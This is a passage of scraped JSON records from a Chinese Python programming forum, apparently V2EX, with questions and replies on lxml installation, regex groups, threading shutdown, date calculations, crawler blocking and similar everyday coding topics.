yandex 的过滤器感觉和 gmail 差不多了,空间还是无限的", " 我非常满意 yandex 特别是默认邮箱功能，不存在的别名或邮箱，直接会被默认邮箱收到。", " 嗯还能用 API 整合其他的系统\r", "另外 Fastmail 相比瑞士那个 Protonmail 哪个更好"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>见： <a href=\"https://zhuanlan.zhihu.com/p/23968852\" rel=\"nofollow\">https://zhuanlan.zhihu.com/p/23968852</a></p>\n<p>谢谢~~</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "手把手教你自制微信公众号流量监控系统", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>网上搜了好久没有搜到，例如我有一个数据表：</p>\n<pre><code>find=a.obejects.all()\n</code></pre>\n<p><code><a href=\"http://a.id\" rel=\"nofollow\">a.id</a></code> 里面的值格式为:</p>\n<pre><code>ESN00000.11\nESN246554.12\nESN89728975.13\nESN123131.12\n.....\n</code></pre>\n<p>我想把点后面的值删除，然后对应增加到新的 a.id2 中</p>\n<p>这个可行吗？脑袋快烂了````</p>\n</div></div>"], "reply": "13", "tittle": "python/Django 如何修改数据里的部分值？", "comment": ["如果小数点后面固定只有两位的话，可以使用 slice ，如果不固定可以使用正则表达式。", "RTFM", "如一楼所言，正则大概可以这么干\r", "先分组 m=re.match(^([\\w]+).([\\d]+)$,a.id)，然后取出其中的 m[1]和 m[2]", "难道不是 id1, id2 = id.split('.') 吗?", "完全不明白你的需求是什么。 id 本来就是存储和业务无关的内容，你要修改 id 的值干什么？", "先改 model \r", "再手动 migrate 一下", "6L 应该是楼主想要的结果， orm 机制可以看这里\r", "\r", "但是我觉得楼主会查询了，应该不会不懂建模吧", " 嗯嗯，这个明白，但是这样子弄以后怎么插回对应的位置呢？", " 意思就是数据库里的数据用正则搞一下，然后插入到新的位置，然后加一个 model 么，有没有简便一些的方法？模式好像不能过滤吧，如果模版可以过滤或者用正则就好了", " 如果这个数据只是展示 而不是查询 你也可以直接 override model 的 __init__()", " 插回对应的位置，数据量不大的话，可以用放进 dict ，再处理。", "小白啊,感觉数据量小扔进 dict 直接切片不就完了..", "考虑到数据库表已经存在，你应该再查一下 migrate 的文档，代码楼上已经给出了答案。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>初学 Python\n仅知道部分模块，请问全部的模块在哪里找？</p>\n</div></div>"], "reply": "2", "tittle": "Python 的模块库在哪里", "comment": [" ok,thx."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>之前每天定时爬的网站，加上了金盾防火墙，然后首次访问会有,<a href=\"http://www.xxx.com/?jdfwkey=yyyyyy\" rel=\"nofollow\">http://www.xxx.com/?jdfwkey=yyyyyy</a>\n就是会有 jdfwkey 这个参数。。。不知道大家爬虫有没有遇到这种情况？怎么解决。。。</p>\n</div></div>"], "reply": "23", "tittle": "当爬虫遇到防火墙", "comment": ["啊！！！找到办法了！！！没有动手直接问果然不好！！！", "卧槽,我就这么打开了", " NSFW 以及这车有点快……", " 为啥我感觉只是他随便发的网站", "记得不是一直有 key ，或者和其他网站记混了，反正我是连可以一起抓", "？？？？？\r", " \r", "随便写的 xxx 能打开？？？", "我曹，还真的能打开！！！我只是作为示例写的网站地址", " 经典域名，上学时我们学校刚接入 ADSL ，然后某领导为了试试怎么上网就输入了这个域名，然后……", " 笑死，居然真能打开\r", "还是用 ", " 比较稳妥", " 看出来是瞎打的，可惜一不小心玩脱了……", "老司机。", "钓鱼贴 活捉老司机", "笑出声", "话说还经常在一些示例里面写 ", " ，看样子以后得小心了。。。", "貌似必须开代理才能打开..", "笑…", "厉害了", "不小心点开了，，哥别闹可以不😣", "所以示例这种网址应该养成习惯，用 ", " 我曹打开了居然！", "😂😂", "然后到底是什么网站谁告诉我一下手机打不开", "33333333"]},
{"content": "", "reply": "9", "tittle": "用 ", "comment": ["代理池大一点，采集的程序分布在多台机器上面跑，采集的频率降低，慢慢采", "搜狗抓公众号信息，文章去微信抓。我抓过上亿条，没有问题的。", "  “搜狗抓公众号信息”指的是在搜狗上抓公众号的功能介绍，微信认证这些信息吗？ “文章去微信抓”具体能说说怎么抓吗？谢了！", "同在搜狗抓微信公众号文章， 加代理没有被封 。 可能如同 @", " 说的，代理的 ip 多一点就没可以了", " \r", " \r", "代理不稳定啊，付费的也是经常掉。", " 花点钱上动态 vps", " 可以购买国外的 vps ，一般最少都带有 2 个以上的 IP ，一般 512m 内存的 VPS 国外的也就 30-40 块人民币", "偷偷说一句，用电话拨号上网 ip 是不断变化的，那就意味着。。。", " 弱问如何在微信里抓。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近用在用 BeautifulSoup ，想安装其官方推荐的 html 解析器<br>\nlxml 安装很顺利，但是使用时报错，报错信息如下<br>\n<img alt=\"报错信息\" src=\"http://ww3.sinaimg.cn/large/6f60f690gw1fa4pie9ztmj20st08hgq3.jpg\"></p>\n<p>我到 BeautifulSoup 文档里面没有找到如何使用的信息，在 lxml 官网也没找到答案，只能腆着脸来 V2 问了<br>\n请大家指教</p>\n<p>python版本是 3.5.2</p>\n</div></div>"], "reply": "16", "tittle": "楼主走投无路了，请问 BeautifulSoup 种是用 lxml 的正确姿势？", "comment": ["python3 python2 。？", " python 版本是 3.5.2", "错一是装的是 python2 的 lxml, 而跑的是 python3,  装 python3 版的是 python3-lxml\r", "错二是跑的是 virtualenv 创建的环境， virtualenv 默认创建的环境不会用到 apt 安装的系统级的三方包， 你该 pip install lxml", "推荐使用 virtualenv", "我 pip install lxml==3.4.2 是好的\r", " ", " 我按您说的，在虚拟环境内 pip install lxml  \r", "但是出现一大堆报错，其中有一条似乎是说我 libxml2 没安装  \r", "但是我有安装的…难道是因为我在 virtualenv 的问题？", " 感谢建议，我用的就是 virtualenv\r", "你看我命令提示符前面有个 py3env ，表示我正在 virtualenv 中", " 难道是我相关依赖没装全吗？ gcc make 什么的我都装了啊", " apt 装 libxml2-dev libxslt1-dev", " 谢谢！  \r", "装了这两个再 pip install lxml 就成功了！", " 没注意到。如果你用了 venv 就不应该使用系统的 apt 安装包", " 其实我一直很懵逼，哪些应该用 pip 安装，哪些应该用 apt-get 安装", " 用了 venv 就全部用 pip 吧，或者自己下载 tar.gz ，用 python setup.py install\r", "apt 装的包 venv 是不会用的", " 那你需要装 libxml2", "日了狗，今天在公司电脑上用同样的方法又不行\r", "为什么总是要困在这种问题上…", "原来还需要 sudo apt-get install zlib1g-dev"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&gt;&gt;&gt; def mark(mo):\n            print(mo.group(1))\n            return mo.group(1)\n\n&gt;&gt;&gt; re.sub(r'@(yangxg)|@(zengshao)|@(zmrenwu)', mark, '@yangxg @zengshao @zmrenwu')\nyangxg\nNone\nNone\n</code></pre>\n<p>原本的的意图去掉每个用户名前的 @ 符号，期望的输入应该是：<code>yangxg zengshao zmrenwu</code></p>\n<p>但事实上对 @zengshao @zmrenwu Match 对象的 group(1) 为 None ？这是怎么回事？</p>\n</div></div>"], "reply": "4", "tittle": "Python re.sub() 的一个奇怪问题？", "comment": ["不知道你为什么这么写。。 re.sub(r'@(\\w+)', mark, '@yangxg @", " @", "') 这样不就可以了么。后面输出为 None 的原因是因为你三个之间是 3 选 1 吧，匹配其中一个就不会匹配后面的了。\r", "你可以看看下面这篇文章\r", "如果这样呢？ \r", "for i in ['@yangxg', '@zengshao', '@zmrenwu']:\r", "    re.sub(r'@(yangxg|zengshao|zmrenwu)', mark, i)\r", "\r", "Python 会为每个() 分配 group, 你那种写法应该要判断 group(1), group(2), group(3)", " 谢谢，我错误理解了捕获组的含义，更正成这样就可以了： re.sub(r'@(yangxg|zengshao|zmrenwu)', mark, '@yangxg @", " @", "')", " 嗯，你的是对的，只是因为我需要匹配特定的用户名，所以我把 (\\w+) 改成了 (yangxg|zengshao|zmrenwu)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对优雅这个词敏感的话，请忽略</p>\n<pre><code>import time\nimport random\nfrom threading import Thread\n\nstop = False\nthreads_num = 20\n\ntodos = list(range(1000))\ntotal = len(todos)\n\ndef test(name):\n    while todos:\n        todo = todos.pop()\n        # print('{}获取到 todo-{}'.format(name, todo))\n        sleep_time = random.randint(1, 5) / 10\n        # print('{}休息{}秒'.format(name, sleep_time))\n        time.sleep(sleep_time)\n        if stop:\n            print('{}收到结束信号正在处理'.format(name))\n            break\n    print('{}结束'.format(name))\n\n\nif __name__ == '__main__':\n    start_time = time.time()\n    # 启动线程\n    threads = []\n    for i in range(threads_num):\n        t = Thread(target = test, args = ('线程-{}'.format(i),))\n        threads.append(t)\n        t.start()\n    \n    # 响应 ctrl+c\n    try:\n        while todos:\n            print('已完成{}中的{}，还剩余{}'.format(total, total - len(todos), len(todos)))\n            time.sleep(1)\n    except KeyboardInterrupt as e:\n        print('收到结束信号，正在处理')\n        stop = True\n\n    # 确认所有子线程结束\n    for t in threads:\n        t.join()\n        \n    print('所有子线程已结束')\n    print('执行清理工作...')\n    print('共计用时{}秒'.format(time.time() - start_time))\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "Python 多线程响应 ctrl+c 优雅退出的方式，代码如下，欢迎交流", "comment": ["曾经试过类似的写法～～～", "子线程里也要响应 keyboard interrupt\r", "或者使用 signal 模块", "很好的 标准做法", "楼主你可以试试把 time.sleep(sleep_time)里的 sleep_time 改成一个很大的值，再 ctrl+c ，试试是什么结果", "我之前也是这么做的，但是就像 @", " 所说， sleep_time 很大的时候直接阻塞在那里了", " \r", " \r", "子线程运行时间太久会阻塞，响应会有延迟。我主要是写爬虫的时候这么用影响不算大。有其他的方法解决这个问题吗", " 后来我在 sleep 那里写了一个 while 循环，把时间切分成很小的原子时间，每一次循环都去判断一次，感觉比较丑陋……"]},
{"content": ["<div class=\"topic_content\">写来玩玩，代码写得比较乱。\r<br>用Docker打包了一下，可以一句话部署。\r<br>\r<br>DEMO ： <a target=\"_blank\" href=\"http://pass.github.tk/\" rel=\"nofollow\">http://pass.github.tk/</a></div>"], "reply": "目前尚无回", "tittle": "写了一个简易密码字典生成器", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>下面的代码我的一个 class ，如何将一些自定义参数在__new__中 return object.__new__(cls) 的时候传入 __init__ 呢？</p>\n<p>比如，我在写 python2 的时候可以直接 return object.__new__(cls, arg0, arg1, **kwargs)， python3.3+就不能直接这样写了。</p>\n<p>python3.3 以上的版本在 return object.__new__(cls) 时直接传入自定义参数的时候会报出 TypeError: object() takes no parameters 。</p>\n<p>参考了：<a href=\"https://stackoverflow.com/questions/34777773/typeerror-object-takes-no-parameters-after-defining-new\" rel=\"nofollow\">StackOverflow 上的帖子</a></p>\n<pre><code>from flask import current_app\n\nfrom utils import SHA256\nfrom orm.user import User\n\n\nclass UserInfo(object):\n    ''' \n    用户基本信息修改类功能\n    '''\n\n    def __new__(cls, **kwargs):\n        userid = kwargs.get('id')\n        name = kwargs.get('name')\n        uid_list = current_app.config.get('USER_ID_LIST')\n        uname_list = current_app.config.get('USER_NAME_LIST')\n        if userid in uid_list or name in uname_list:\n            return object.__new__(cls)\n        return None\n\n    def __init__(self, **kwargs):\n        uid = kwargs.get('id')\n        name = kwargs.get('name')\n\n        if uid:\n            obj = User.query.filter_by(id=uid).first()\n        elif name:\n            obj = User.query.filter_by(name=name).first()\n        self.obj = obj \n        self.user_id = obj.id\n        self.user_name = obj.name\n\n    def set_pwd(self, pwd):\n        self.obj.passwd = SHA256(pwd)\n        self.obj.update()\n</code></pre>\n</div></div>"], "reply": "3", "tittle": "python3.3 以上版本的新式类中，如何在同时覆盖 __new__ 和 __init__ 时，将自定义的额外参数从 __new__ 传入 __init__ ？", "comment": ["class A(object):\r", "    def __new__(cls, i, j):\r", "        print(cls, i, j)\r", "        return object.__new__(cls)\r", "\r", "    def __init__(self, x, y):\r", "        print(self, x, y)\r", "        self.x = x\r", "        self.y = y\r", "\r", "Python3 中 __new__ 和 __init__ 方法接受的参数必须是一样的。\r", "\r", "lz 可以试试参数不一样的情况。", "format 一蛤\r", "\r", "```python\r", "class A(object): \r", "    def __new__(cls, i, j): \r", "        print(cls, i, j) \r", "        return object.__new__(cls) \r", "\r", "    def __init__(self, x, y): \r", "        print(self, x, y) \r", "        self.x = x \r", "        self.y = y \r", "```\r", "\r", "Python3 中 __new__ 和 __init__ 方法接受的参数必须是一样的。 \r", "\r", "lz 可以试试参数不一样的情况", "  无效，用 return object.__new__(cls) 的话参数不同基本上就是 __init__ 无法接收这些参数，一旦在 return object.__new__(cls) 时添加更多的参数，就会报 object() takes no parameters"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>关于 bottle 的中文链接的问题</h1>\n<p>我发现类似\n<code>“/z/讨厌啃苹果.html ”</code>或者\n<code>“/z/%E8%AE%A8%E5%8E%8C%E5%95%83%E8%8B%B9%E6%9E%9C.html ”</code>都会直接报错误<code>“ Critical error while processing request ”</code>，请问应该怎么解决？</p>\n</div></div>"], "reply": "1", "tittle": "关于 bottle 的中文链接的问题", "comment": ["相关的错误提示：\r", "Error:\r", "\r", "RuntimeError('Request context not initialized.',)\r", "\r", "Traceback:\r", "\r", "Traceback (most recent call last):\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 1653, in fget\r", "    try: return ls.var\r", "AttributeError: '_thread._local' object has no attribute 'var'\r", "\r", "During handling of the above exception, another exception occurred:\r", "\r", "Traceback (most recent call last):\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 954, in wsgi\r", "    out = self._cast(self._handle(environ))\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 907, in _cast\r", "    out = self.error_handler.get(out.status_code, self.default_error_handler)(out)\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 842, in default_error_handler\r", "    return tob(template(ERROR_PAGE_TEMPLATE, e=res))\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 3609, in template\r", "    return TEMPLATES[tplid].render(kwargs)\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 3399, in render\r", "    self.execute(stdout, env)\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 3386, in execute\r", "    eval(self.co, env)\r", "  File \"<string>\", line 17, in <module>\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 1249, in url\r", "    return self.urlparts.geturl()\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 165, in __get__\r", "    key, storage = self.key, getattr(obj, self.attr)\r", "  File \"C:\\Users\\Administrator\\Anaconda3\\lib\\site-packages\\bottle.py\", line 1655, in fget\r", "    raise RuntimeError(\"Request context not initialized.\")\r", "RuntimeError: Request context not initialized."]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近写爬虫，遇到一个网站，会定时清掉我的登录状态。我想知道我怎样才能判断自己是否有登录。\n现在我采取的办法是有一些页面元素里未登录的话有 ihide ，我是通过判断是否有 ihide 这个 class 来判断是否登录的。\n我想知道能不能通过 cookie 或者 session 来判断，感觉这样稳妥点？</p>\n</div></div>"], "reply": "3", "tittle": "关于网站登录状态的一点小问题", "comment": ["别人家的网站 session 你能判断的了？\r", "只能试试 cookie 吧，有效期啥的，或者被踢出后的 cookie 变动。", "如果没有登录网站会重定向你到登录页的话，可以通过返回状态码判断。", " cookie 有效期的数据也能读的出来吗？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><pre><code>&gt;&gt;&gt; d = {(x, x+1): x for x in range(10)}\n&gt;&gt;&gt; d\n{(0, 1): 0, (1, 2): 1, (6, 7): 6, (5, 6): 5, (7, 8): 7, (8, 9): 8, (4, 5): 4, (2, 3): 2, (9, 10): 9, (3, 4): 3}\n</code></pre>\n<p>问题是， d 为什么是按照上面这种顺序生成的，为什么不是</p>\n<pre><code>{(0, 1): 0, (1, 2): 1, (2, 3): 2, (3, 4): 3, (4, 5): 4, (5, 6): 5, (6, 7): 6, (7, 8): 7, (8, 9): 8, (9, 10): 9}\n</code></pre>\n</div></div>"], "reply": "7", "tittle": "Python 新手问一个关于 dictionary comprehension 的问题", "comment": ["字典非有序", " 这个我可以理解，但是\r", "\r", ">>> d = {x:x for x in range(10)}\r", ">>> d\r", "{0: 0, 1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7, 8: 8, 9: 9}\r", "\r", "这里是有序的，为什么 key 是 tuple 的时候就无序了呢？", " 这里也是无序的，你看到的顺序并不能说明什么，你在使用时，他不保证就是这个顺序", " 你确定这样就是有序的？", "要有序字典可以\r", "\r", "from collections import OrderedDict\r", "\r", "按照装入的顺序排列", "字典不保证有序是标准。但任何语言标准都有具体实现，在实现时可能恰好有序，也可能恰好无序，但这些是语言背后的实现，我们语言的用户不用理会，现在恰好有序的，以后也有可能修改成无序。因此，标准说了无序，我们就要一律把它当作无序来处理。", "别着急， python3.6+就会默认所有字典有序！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近写了一个通过 pyqt 模仿暴雪界面的项目，旨在给予学习 pyqt 的同行一些借鉴。</p>\n<p>这里是项目地址：<a href=\"https://github.com/littlecodersh/blizzardui\" rel=\"nofollow\">github</a></p>\n<p>配色、样式、配图皆来源于暴雪，但具体的项目实现存在一些个人的取巧。</p>\n<p>希望这个项目可以帮助你更快的完成界面的搭建或者入门 pyqt 。</p>\n<p>由于 QtWebKit 的变化，目前 pyqt5.6 及以上的版本不能被支持。</p>\n<p>目前该项目仅完成了聊天窗口的部分，其余部分将陆续更新。</p>\n<h2>简单入门实例</h2>\n<p>在将本项目下载到本地后，你可以这样运行：</p>\n<pre><code>python demo.py\n</code></pre>\n<p>运行后，你将看到这样的界面：</p>\n<p><img alt=\"chatroom-demo\" src=\"http://7xrip4.com1.z0.glb.clouddn.com/blizzardui/chatroom-demo.png\"></p>\n<h2>方法说明</h2>\n<p>下面我们就演示程序对如何使用做一个简单的讲解：</p>\n<pre><code>#coding=utf8\nimport sys\n\nfrom blizzardui.pyqt.QtGui import (\n    QApplication, QPixmap)\n\nfrom blizzardui.widgets import Chatroom\n\n# 常规的启动动作就不多加说明\napp = QApplication(sys.argv)\n# 两个 NickName 定义了来往的用户昵称\n# headImage 应当为一个 46*46 的 QPixmap ，当然如果过大也会被自动截取\nmainWindow = Chatroom(toNickName=u'好友 A', fromNickName='LittleCoder',\n    headImage=QPixmap('src/chatroom/images/header/default_image.png'))\nmainWindow.show()\n\n# 当你输入一些内容并使用 Enter 时，将会调用该方法\ndef fn(msg):\n    mainWindow.add_msg(msg)\n    print(unicode(msg))\nmainWindow.messageReceived.connect(fn)\n\n# 通过 add_msg ，可以向历史记录中加入消息\n# 如果 isSend 设为 False ，将会判定为是收到的消息\nmainWindow.add_msg('yo' * 50)\nmainWindow.add_msg('yo', isSend=False)\nmainWindow.add_msg('yo')\n# 通过 set_footer ，可以设置页尾的内容\nmainWindow.set_footer(u'最后登录')\n\nsys.exit(app.exec_())\n</code></pre>\n<h2>关于</h2>\n<p>Q: 为什么不使用 QWebEngineView ？</p>\n<p>A: 我没能找到一个很好的办法让 QWebEngineView 快速启动，所以会出现初始化时闪烁以及无法加入消息的问题。</p>\n<h2>另</h2>\n<p>如果有什么问题或者建议都可以在这个<a href=\"https://github.com/littlecodersh/blizzardui/issues/1\" rel=\"nofollow\">Issue</a>和我讨论</p>\n</div></div>"], "reply": "7", "tittle": "pyqt 模仿暴雪聊天框", "comment": ["WebEngineView 可以先不 show 出来，等接到 load 完了的 signal 再 show 。", "沒記錯的話，戰網客戶端就是用 Qt 開發的", " 是的", " 主要是主界面不 show ， WebEngineView 不载入 html ，有什么解决方案吗？", " WebEngine 不显式初始化的话，会依赖所属的 widget 来初始化。你试试先 QtWebEngine::initialize();", " 多谢，我这里直接用的是 QtWebEngineWidgets 里面的 QtWebEngineView ，我看看有没有类似的解决方案。", "可惜我安装的是 pyqt 5.7 了，学习一下子"]},
{"content": "", "reply": "14", "tittle": "最近闲来无事初学 python，小甲鱼那套视频有必要看么，或者有什么建议或者书籍推荐", "comment": ["书的话 PythonCookbook 吧。其实我觉得不如花点时间随便看看语法，然后找个 python 的项目边看边学。", "上次回答的 ", "\r", "如果你真想搞的话\r", "\r", "\r", "你需要看的是这个 \r", " \r", "正统的教程（ sicp 的 python 版本） \r", "而不是啥都提一点点的 （*** python 教程）", " 纯英文的教材英语一般的恐怕压力很大，虽然搞编程必须懂英文，但开始的时候可能英文还没那么好， python2 在官网有中文版教材， python3 似乎还没有", " 有程序基础没 python 经验，直接从爬虫教程试着搞起可行否？", "那些不负责的，一上来就推荐说看什么官方文档的。真是误人\r", "我觉得最好买一本 《 python 基础教程》看，将里面项目敲一遍", " 好的谢谢，其实官方文档什么的，我一般也就当成工具用，具体的还得去找个能尝试着抄的项目靠谱点", "右侧栏的推荐书籍", "看视频太费时间了，看书快， 《 PYTHON 学习手册》讲得比较全，讲的 PY3", "《 Programming in Python 3 》这本书如何？最近想学学 python ，同事给推荐的。", "可以看，二倍速看，中间有些打趣的话也可以跳过。", "看视频真的很浪费时间，建议还是找套教程看吧  \r", "我看的是廖雪峰的 python3 教程，虽然有些地方挺跳跃的，让人半天想不明白，但整体上还算合格的入门教程", "你需要的 ", "个人觉得先得安装一个集成工具， Pythonxy 或者 anaconda", "我觉得《 python 语言及其应用》这书不错"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"https://github.com/hellorocky/LearnByCoding/tree/master/python/crawler/pyaxel\" rel=\"nofollow\">https://github.com/hellorocky/LearnByCoding/tree/master/python/crawler/pyaxel</a></div>"], "reply": "16", "tittle": "周末造轮子之多线程文件下载----Pyaxel, 你值得拥有", "comment": ["赞！支持一下飞群", " O(∩_∩)O 谢谢,你是哪位啊,居然报我名字....囧", "看到 TODO 里有 Progress bar ，推荐下个人的库;D\r", "可以实时显示多行进度条，很适合多线程状态展示:D \r", "看到了“/tmp ”，是 Linux 限定？\r", "第 45 行是不是有 typo ？ printf 应该是 print 吧？\r", "shebang 改成\"/usr/bin/env python3\"会不会好一点，因为我看这个应该是 3.x 的语法。\r", "还有清除临时文件那里，我觉得维护个临时文件的列表比较好，要是有别的程序也用了那个目录就麻烦了……", "  谢谢建议,对于 /tmp 目录,是同时支持 Linux 和 MacOS 的,不支持 win,shebang 确实应该改成 python3,临时目录因为我的 mac 硬盘比较小,所以就清除了临时文件,使用 /tmp 目录也是这个目的", " 谢谢,今晚回家搞~", "几个建议：\r", "多线程的 ctrl+c 的捕获\r", "Win 的支持,不要写死 /tmp,看看 tempfile 这个库\r", "更用户友好的 print\r", "download 的超时重试之类的\r", "其实可以考虑完全不用外部的依赖,用 urllib/argparse 之类的,减少使用的人的负担", " 感谢", "如果下载的文件名重复了怎么办  还有会记录每个文件对应的下载源地址吗", " 发现重复的时候会在新下载的文件后面加上.new 后缀,不是很理解第二个问题,下载地址是必传参数,记录每个文件对应的下载源地址是什么意思?", "比如我的文件是 ", "  ", "  我是怎么知道 1.zip 到底是 V2EX 的还是百度的，迅雷等下载工具可以查看下载源地址", "axel 对 https 支持的不好，不要过于浪费时间了，练练手就行了", "pycurl ，可以考虑考虑", " 嗯嗯,就是为了练练手,拆拆轮子,造造轮子", " 这个...只能用 MD5 来校验了,不过程序员估计也不会遇到这种情况吧...", " 为什么不是跟.数字，如果已经有.new 了怎么办。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>以周三为例，根据当前时间点，获取下一次最近的周三日期</p>\n<pre><code> def get_wednesday_date():\n     today = date.today()  \n     days = 2 - today.weekday()  \n     time_delta = timedelta(days=days) if days &gt; 0 else timedelta(days=7+days) \n     return  today + time_delta\n</code></pre>\n<p>可以就代码风格和实现讨论，提供更 pythonic 的想法</p>\n</div></div>"], "reply": "15", "tittle": "获取下个周三的日期", "comment": ["```python\r", "\r", "def get_wednesday_date():\r", "    return date.today() + timedelta(((2 - date.today().weekday()) + 7) % 7)\r", "\r", "```", "import datetime\r", "\r", "now=datetime.datetime.now()\r", "dayslater=now+datetime.timedelta(7)\r", "print(dayslater.strftime('%Y%m%d'))", "php:\r", "\r", "datetime('Y-m-d H:i:s', strtotime('next Wednesday'));", " php 原生没有 datetime 函数吧。 echo date('Y-m-d', strtotime('next Wednesday'));", "def get_wednesday_date():\r", "   today = datetime.datetime.today().isoweekday()\r", "   time_delta = timedelta(date=3 - today + (3<today) * 7)\r", "   return  today + time_delta", "搞不懂~我的不是最简洁的吗？", "```jodatime or javase8\r", "\r", "LocalDate localDate = LocalDate.now();\r", "System.out.println(localDate.with(DayOfWeek.WEDNESDAY).plusWeeks(1));\r", "\r", "```", " 审题错误，零分😂", "给另一个 Joda Time 的写法\r", "DateTime nextWednesday = new DateTime().withDayOfWeek(3).plus(Weeks.ONE);", "```\r", ">>> import parsedatetime\r", ">>> cal = parsedatetime.Calendar()\r", ">>> cal.parse(\"next Wednesday\")\r", "(time.struct_time(tm_year=2016, tm_mon=12, tm_mday=7, tm_hour=9, tm_min=0, tm_sec=0, tm_wday=2, tm_yday=342, tm_isdst=-1), 1)\r", ">>> cal.parse(\"this coming wednesday\")\r", "(time.struct_time(tm_year=2016, tm_mon=11, tm_mday=30, tm_hour=19, tm_min=59, tm_sec=28, tm_wday=2, tm_yday=335, tm_isdst=-1), 1)\r", "```\r", "\r", "（逃……", "感觉 @", " 的比较清真", "* 安装\r", "```shell\r", "pip install isoweek\r", "```\r", "\r", "* 使用\r", "```python\r", "In [1]: from isoweek import Week\r", "\r", "In [2]: (Week.thisweek() + 1).wednesday()\r", "Out[2]: datetime.date(2016, 12, 7)\r", "```", "囧，　搞成下周的周三了", "```python\r", "In [1]: from datetime import datetime\r", "\r", "In [2]: from isoweek import Week\r", "\r", "In [3]: def coming_weekday(num):\r", "   ...:     this_week = Week.thisweek()\r", "   ...:     this_weekday = this_week.day(num)\r", "   ...:     return this_weekday if this_weekday > datetime.now().date() else (this_week + 1).day(num)\r", "   ...: \r", "\r", "In [4]: coming_weekday(2)\r", "Out[4]: datetime.date(2016, 11, 30)\r", "\r", "In [5]: # 0 is Monday\r", "```", "```python\r", "In [13]: def coming_weekday(num):\r", "    this_week = Week.thisweek()\r", "    return (this_week + (not this_week.day(num) > datetime.now().date())).day(num)\r", "   ....:\r", "```"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>平时写 Ruby 比较多，最近要写些 Python 。比如我有一个表格，需要对每个单元格做一些操作，然后返回一个新表格，用 Ruby ，我会这样：</p>\n<pre><code># Ruby\ntable.map { |row|\n  row.map { |cell|\n    ...\n    do_something(cell)\n    ...\n  }\n}\n</code></pre>\n<p>如果这个 do_something 逻辑需要多行，如何在 Python 中优雅的实现呢？</p>\n<p>试过：</p>\n<p>列表解析：</p>\n<pre><code>[[do_something(cell) for cell in row] for row in table]\n\n</code></pre>\n<p>但是我不知道如何优雅地扩展成多行。</p>\n<p>同样的，用 map 也难以扩展成多行:</p>\n<pre><code>list(map(lambda row: list(map(lambda cell: do_something(cell), row)), table))\n</code></pre>\n<p>当然我可以把要做的操作定义成方法，不过方法多了也比较麻烦。</p>\n<p>请问最优雅的做法是什么？</p>\n</div></div>"], "reply": "10", "tittle": "Python 中如何优雅地写多行列表解析？", "comment": ["for row in table:\r", "  for cell in row:\r", "    do_something(cell)", " 我要不改动原 table 的情况下新建一个 table ，这样的话就要不停地手动建立元素然后插入新列表", " 那你就在 do_something 里面写多几行不就行了", "Python 顶多就这样了。 lambda 只能单行，不比 ruby 的 block 灵活。\r", "\r", "def do_something(cell):\r", "____pass\r", "\r", "[[do_something(cell) for cell in row] for row in table]", "用 map", "import pandas as pd", "同 4L ， Python 的 lambda 比较费，只能提前建好一个函数了", "不建议使用：\r", "[[do_something(cell) for cell in row] for row in table]\r", "这种写法，有坑。", "哦。我也想把具体的 “坑” 说清楚，但时间太久了。 Orz...", "map(lambda x:map(do_something,x),a)"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原始数据是一个由元组构成的列表，每个元组包含年、月、 P 级、数量，要转换成 JSON ，具体示例如下：</p>\n<pre><code># 原始数据\nrs=[(2016,1,'p0',1),(2016,2,'p1',2),(2016,2,'p2',3),(2016,3,'p3',25),(2016,4,'p4',55)]\n\n# 目标 JSON ，如果某月没有相应的 P 级的数据，要补 0\n{'p2': [0, 3, 0, 0], \n 'p3': [0, 0, 25, 0], \n 'p0': [1, 0, 0, 0], \n 'p1': [0, 2, 0, 0], \n 'p4': [0, 0, 0, 55], \n 'categories': ['2016-1', '2016-2', '2016-3', '2016-4']}\n</code></pre>\n<p>下面是我的做法，是把数据先转换为 dict ，然后在遍历生成 JSON 的时候通过 setdefault 把缺失的数据补 0 。但是感觉很笨，不知道更好的做法是什么？</p>\n<pre><code># coding=utf-8\nrs=[(2016,1,'p0',1),(2016,2,'p1',2),(2016,2,'p2',3),(2016,3,'p3',25),(2016,4,'p4',55)]\n\n# 预处理，把 rs 转换为字典\ndict1 = {}\n\nfor (year, month, p_level, count) in rs:\n    dict1.setdefault(year,{})\n    dict1[year].setdefault(month,{})\n    dict1[year][month].setdefault(p_level,{})\n    dict1[year][month][p_level] = count\n# dict1 &gt;&gt; {2016: {1: {'p0': 1}, 2: {'p2': 3, 'p1': 2}}}\n\n# 预处理，取年份月份和 P 级的集合，这样数据有变化也可以处理\np_levels = []\nmonths = []\nyears = []\n\nfor i in rs:\n    if 